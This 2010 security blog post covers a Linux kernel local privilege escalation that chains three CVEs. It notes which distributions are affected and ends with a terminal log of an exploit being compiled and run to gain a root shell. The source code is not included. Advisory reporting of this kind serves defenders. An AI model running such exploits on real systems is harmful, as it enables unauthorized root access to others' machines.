---
layout: post
title: Linux Kernel <= 2.6.37 local privilege escalation
date: '2010-12-08T08:45:00.001+01:00'
author: Xavier Garcia
tags:
- escalation
- Linux
- privilege
modified_time: '2010-12-08T08:46:48.484+01:00'
blogger_id: tag:blogger.com,1999:blog-8534555958859253862.post-8260279256518032125
blogger_orig_url: http://www.shellguardians.com/2010/12/linux-kernel-2637-local-privilege.html
---
A new local privilege escalation has been discovered in the Linux kernel as reported in the [Full Disclosure](http://seclists.org/fulldisclosure/2010/Dec/85) mailing list.  
  
The exploit combines three different vulnerabilities to gain root privileges: CVE-2010-4258, CVE-2010-3849 and CVE-2010-3850.  

  

Affected systems
================

The Econet protocol (CVE-2010-3849) is not supported by default in RedHat like distributions (RHEL, CentOS and Fedora) and the majors distributions already patched CVE-2010-3849 and CVE-2010-3850, so up to date systems should not be affected by this particular exploit.  

  

CVE-2010-4258 is the main vulnerability and it is still unpatched. Somebody could find another way to trigger the vulnerability.

  
```bash
msk@ubuntu:~/exploit$ gcc  15704.c  -o foo

msk@ubuntu:~/exploit$ ./foo 

[*] Resolving kernel addresses...

 [+] Resolved econet_ioctl to 0xe08b72a0

 [+] Resolved econet_ops to 0xe08b73a0

 [+] Resolved commit_creds to 0xc016c830

 [+] Resolved prepare_kernel_cred to 0xc016cc80

[*] Calculating target...

[*] Triggering payload...

[*] Got root!

# id

uid=0(root) gid=0(root) groups=0(root)

#
```
